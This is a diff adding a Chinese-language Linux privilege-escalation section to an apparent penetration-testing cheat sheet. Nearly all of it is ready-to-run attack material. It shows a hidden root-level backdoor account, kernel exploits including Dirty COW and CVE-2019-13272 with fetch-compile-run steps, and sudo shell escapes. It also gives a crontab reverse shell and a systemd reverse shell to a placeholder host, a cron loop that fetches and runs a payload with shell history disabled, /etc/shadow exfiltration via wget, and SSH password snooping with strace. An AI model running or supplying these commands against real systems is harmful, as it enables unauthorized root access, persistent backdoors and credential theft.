@@ -344,6 +344,390 @@ tcpdump -i any -s 0 -w tcpdump.pcap	//当机器有多个网卡，不确定流量
 tcpdump -r <input_pcap> -w <output_pcap> -C <file_size>	//input_pcap是您要拆分的文件的名称，output_pcap是输出，而<file_size>是拆分文件的近似大小以兆字节为单位。
 tcpdump -r input_packet_capture.pcap -w output_packet_capture.pcap -C 25	//将文件拆分为约25mb的块
 ```
+## Linux 系统
+
+### linux一条命令添加一个root级别账户并设置密码
+{{% notice tip %}}
+内网机器提权添加账户，无回显，设置密码就不好弄，下面就是添加一个root级别的账户并设置密码的命令
+{{% /notice %}}
+```
+useradd -p `openssl passwd -1 -salt 'lsof' admin` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/lsof lsof
+
+// 命令解释
+
+useradd 添加用户
+
+-p `openssl passwd -1 -salt 'lsof' admin` 这个里面的指的是设置用户的密码，里面的lsof差不多是密钥之类的，可以随便写， admin是明文密码
+
+-u 0 -o 添加一个uid为 0的用户 就相对于root级别的了
+
+-g root -G root 将用户添加到root组
+
+-s /bin/bash 指定新建用户的shell路径
+
+-d /usr/bin/lsof 新建用户的主目录，可以自己定义
+
+lsof 新建的用户的用户名
+```
+
+### dirtycow 
+
+```
+curl -O https://access.redhat.com/sites/default/files/rh-cve-2016-5195_3.sh && chmod +x rh-cve-2016-5195_3.sh
+
+./rh-cve-2016-5195_3.sh && rm -f rh-cve-2016-5195_3.sh	//脏牛漏洞检测
+或
+curl -O https://raw.githubusercontent.com/aishee/scan-dirtycow/master/dirtycowscan.sh  && chmod +x dirtycowscan.sh
+
+./dirtycowscan.sh && rm -f dirtycowscan.sh	//脏牛漏洞检测，适用redhat、ubuntu等
+
+curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c //下载
+
+gcc -pthread dirty.c -o dirty -lcrypt	//编译
+
+./dirty or ./dirty my-new-password	//运行，默认账号firefart
+
+python -c 'import pty; pty.spawn("/bin/bash")' 	//获得标准交互式shell
+
+su firefart	//交互式登陆
+
+mv /tmp/passwd.bak /etc/passwd	//提权添加后门后还原/etc/passwd
+```
+![](/img/dirtycow2.png)
+![](/img/dirtycow3.png)
+
+### CVE-2021-3156
+```
+curl -O https://access.redhat.com/sites/default/files/cve-2021-3156--2021-02-01-1206.sh && chmod +x cve-2021-3156--2021-02-01-1206.sh
+./cve-2021-3156--2021-02-01-1206.sh && rm -f cve-2021-3156--2021-02-01-1206.sh
+访问exp
+https://github.com/blasty/CVE-2021-3156
+```
+###  Linux sock_sendpage() NULL pointer dereference(CVE-2009-2692)
+Linux kernel versions from 2.4.4 to 2.4.37.4, and from 2.6.0 to 2.6.30.4
+```
+gcc -Wall -o linux-sendpage linux-sendpage.c	//i386
+gcc -Wall -m64 -o linux-sendpage linux-sendpage.c	//x86_64
+```
+### CVE-2016-5195
+
+```
+wget --no-check-certificate https://github.com/gbonacini/CVE-2016-5195/archive/master.zip	//下载
+
+unzip master.zip && cd CVE-2016-5195-master/
+
+make	//编译
+
+./dcow -h	//查看帮助说明
+
+./dcow -s	//强制密码"dirtyCowFun"（SHA-512）。在成功执行的情况下，使用该密码执行"su"操作，则可以使用root shell。使用-s选项（建议）
+```
+### 通过SUID进行Linux本地root提权
+
+这会影响版本等于或大于2.6.39的Linux内核,Red Hat，Centos和Ubuntu的最新版本受到影响。
+```
+$ wget www.tux-planet.fr/public/hack/exploits/kernel/mempodipper.c
+$ gcc mempodipper.c -o mempodipper
+$ ./mempodipper
+===============================
+= Mempodipper =
+= by zx2c4 =
+= Jan 21, 2012 =
+===============================
+
+[+] Waiting for transferred fd in parent.
+[+] Executing child from child fork.
+[+] Opening parent mem /proc/6454/mem in child.
+[+] Sending fd 3 to parent.
+[+] Received fd at 5.
+[+] Assigning fd 5 to stderr.
+[+] Reading su for exit@plt.
+[+] Resolved exit@plt to 0x402178.
+[+] Seeking to offset 0x40216c.
+[+] Executing su with shellcode.
+sh-4.2# whoami
+root
+```
+### Linux内核2.6.32到3.8.10的本地root漏洞
+
+```
+$ wget https://raw.githubusercontent.com/realtalk/cve-2013-2094/master/semtex.c
+$ gcc -O2 semtex.c
+$ ./a.out
+```
+### CVE-2009-2692
+
+Linux kernel versions from 2.4.4 to 2.4.37.4, and from 2.6.0 to 2.6.30.4
+```
+ * For i386 and ppc, compile with the following command:
+ * gcc -Wall -o linux-sendpage linux-sendpage.c
+ *
+ * And for x86_64 and ppc64:
+ * gcc -Wall -m64 -o linux-sendpage linux-sendpage.c
+ 
+wget --no-check-certificate https://raw.githubusercontent.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/master/2009/CVE-2009-2692/2.6.18.c
+```
+### 4.4.0-116-generic测试通过
+![](/img/20180804200811.png)
+
+### SSH-注入
+```
+wget --no-check-certificate https://github.com/xpn/ssh-inject/archive/master.zip && unzip master.zip && cd ssh-inject-master 	//下载解压文件并进入目录
+make	//编译
+ps aux | grep sshd	//查看sshd服务进程id
+./run.sh xxx	//注入id进程获取ssh登陆用户密码
+```
+### 利用易受攻击的SUID可执行文件获取root访问权限
+```
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+### /etc/sudoers可写
+```
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+
+# use SUDO without password
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
+### crontab计划任务
+```
+(crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -
+```
+### 滥用sudo权限提升
+`sudo -l`显示用户拥有所有这个二进制文件允许在没有密码的`root`用户上执行
+![](/img/Screenshot-from-2018-04-10-23-39-46.png)
+#### find
+```
+sudo find /etc/passwd -exec /bin/sh \;
+sudo find /bin -name nano -exec /bin/sh \;
+```
+#### Vim
+```
+sudo vim -c '!sh'
+```
+#### Nmap
+```
+sudo nmap --interactive
+nmap> !sh
+sh-4.1#
+
+注意：nmap -interactive选项在最新的nmap中不可用
+
+echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse //没有交互的最新方式
+```
+#### Man
+```
+sudo man man
+```
+之后输入`!sh`然后进入
+#### Less/More
+```
+sudo less /etc/hosts
+sudo more /etc/hosts
+```
+之后输入`!sh`然后进入
+#### awk
+```
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
+#### nano
+使用nano编辑器编辑passwd文件。在`/etc/passwd`中添加此行以将用户添加为`root`权限。
+`touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash`或无密码`touhid::0:0::/root:/bin/bash`
+```
+sudo nano /etc/passwd
+```
+现在切换用户密码是：`test`
+```
+su touhid
+```
+#### wget
+首先将靶机的`/etc/passwd`文件复制到攻击者计算机,修改passwd文件追加这一行`touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash`
+```
+sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
+```
+现在切换用户密码是：`test`
+```
+su touhid
+```
+注意：如果你想从服务器转储文件，比如root的ssh key,Shadow文件等。
+```
+sudo wget --post-file=/etc/shadow 192.168.56.1:8080
+```
+攻击者设置监听器：`nc –lvp 8080`
+#### apache
+遗憾的是你无法获得Shell和Cant编辑系统文件。但使用这个你可以查看系统文件。
+```
+sudo apache2 -f /etc/shadow
+```
+#### tcpdump
+```
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	//新建文件/tmp/.test，把命令写进/tmp/.test比如"id"
+```
+#### systemctl
+```
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "bash -i >& /dev/tcp/x.x.x.x/4444 0>&1"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+export HISTFILE=/dev/null && echo "*/1 * * * * (cd /tmp && curl x.x.x.x/x.txt -o zabbix && chmod +x zabbix && ./zabbix)|sh" | crontab -
+crontab -r
+或
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "bash -i >& /dev/tcp/x.x.x.x/4444 0>&1"
+[Install]
+WantedBy=multi-user.target' > $TF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+export HISTFILE=/dev/null && echo "*/1 * * * * (cd /tmp && curl x.x.x.x/x.txt -o zabbix && chmod +x zabbix && ./zabbix)|sh" | crontab -
+crontab -r
+```
+### CVE-2018-14665：Xorg X服务器漏洞
+```
+cd /etc; Xorg -fp "root::16431:0:99999:7:::"  -logfile shadow  :1;su
+```
+或
+```
+#!/bin/sh
+# local privilege escalation in X11 currently
+# unpatched in OpenBSD 6.4 stable - exploit
+# uses cve-2018-14665 to overwrite files as root. 
+# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
+# and vulnerable in default OpenBSD.
+#
+# - https://hacker.house
+echo [+] OpenBSD 6.4-stable local root exploit
+cd /etc
+Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh' -logfile master.passwd :1 &
+sleep 5
+pkill Xorg
+echo [-] dont forget to mv and chmod /etc/master.passwd.old back 
+echo [+] type 'Password1' and hit enter for root
+su -
+```
+### CVE-2016-8655 (Ubuntu 14.04 / 16.04 x86-64)
+```
+gcc chocobo_root.c -o chocobo_root -lpthread
+./chocobo_root
+```
+以下是理论支持内核版本列表：
+```
+4.4.0-46-generic #67~14.04.1
+4.4.0-47-generic #68~14.04.1
+4.2.0-41-generic #48
+4.8.0-22-generic #24
+4.2.0-34-generic #39
+4.2.0-30-generic #36
+4.2.0-16-generic #19
+4.2.0-17-generic #21
+4.2.0-18-generic #22
+4.2.0-19-generic #23~14.04.1
+4.2.0-21-generic #25~14.04.1
+4.2.0-30-generic #36~14.04.1
+4.2.0-27-generic #32~14.04.1
+4.2.0-36-generic #42
+4.4.0-22-generic #40
+4.2.0-18-generic #22~14.04.1
+4.4.0-34-generic #53
+4.2.0-22-generic #27
+4.2.0-23-generic #28
+4.2.0-25-generic #30
+4.4.0-36-generic #55
+4.2.0-42-generic #49
+4.4.0-31-generic #50
+4.4.0-22-generic #40~14.04.1
+4.2.0-38-generic #45
+4.4.0-45-generic #66
+4.2.0-36-generic #42~14.04.1
+4.4.0-45-generic #66~14.04.1
+4.2.0-22-generic #27~14.04.1
+4.2.0-25-generic #30~14.04.1
+4.2.0-23-generic #28~14.04.1
+4.4.0-46-generic #67
+4.4.0-47-generic #68
+4.4.0-34-generic #53~14.04.1
+4.4.0-36-generic #55~14.04.1
+4.4.0-31-generic #50~14.04.1
+4.2.0-38-generic #45~14.04.1
+4.2.0-35-generic #40
+4.4.0-24-generic #43~14.04.1
+4.4.0-21-generic #37
+4.2.0-34-generic #39~14.04.1
+4.4.0-24-generic #43
+4.4.0-21-generic #37~14.04.1
+4.2.0-41-generic #48~14.04.1
+4.8.0-27-generic #29
+4.8.0-26-generic #28
+4.4.0-38-generic #57
+4.4.0-42-generic #62~14.04.1
+4.4.0-38-generic #57~14.04.1
+4.4.0-49-generic #70
+4.4.0-49-generic #70~14.04.1
+4.2.0-21-generic #25
+4.2.0-19-generic #23
+4.2.0-42-generic #49~14.04.1
+4.4.0-43-generic #63
+4.4.0-28-generic #47
+4.4.0-28-generic #47~14.04.1
+4.9.0-1-generic #2
+4.8.0-28-generic #30
+4.2.0-35-generic #40~14.04.1
+4.2.0-27-generic #32
+4.4.0-42-generic #62
+4.4.0-51-generic #72
+```
+### CVE-2019-13272 Linux local root exploit
+Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
+```
+wget https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c
+gcc -s CVE-2019-13272.c -o pwned
+```
+
+### SSH Snooping
+通过本地权限升级漏洞获得root权限？想要他的密码，但不能破解？你可以尝试ssh snooping ..
+```
+#!/bin/bash
+
+while true; do
+   ps_test=`ps ax|grep sshd|grep -v grep|grep priv|tr -s ' '`
+   if [ -n "$ps_test" ]
+   then
+     f=$RANDOM
+     a="output$RANDOM.log"
+     strace -e trace=read -p $(echo $ps_test | awk '{print $1}') -o $f
+     cat $f | grep 'read(6,' > $a
+     rm $f
+     chown root:root $a
+     chmod 600 $a
+   else
+     echo -e ".\c"
+     sleep 0.1
+   fi
+done
+```
+### sudo可能绕过Runas用户限制(CVE-2019-14287)
+```
+sudo -u#-1 id -u
+或
+sudo -u#4294967295 id -u
+```
+### sudo提权漏洞(CVE-2019-18634)
+```
+perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+```
+### CVE-2019-15666(Linux内核3.x-5.x XFRM UAF PoC)
+```
+while :; do ./lucky0 -q && break; done
+sudo -s
+```
+
 # postgresql命令执行
 使用数据库获取系统信息
 ```
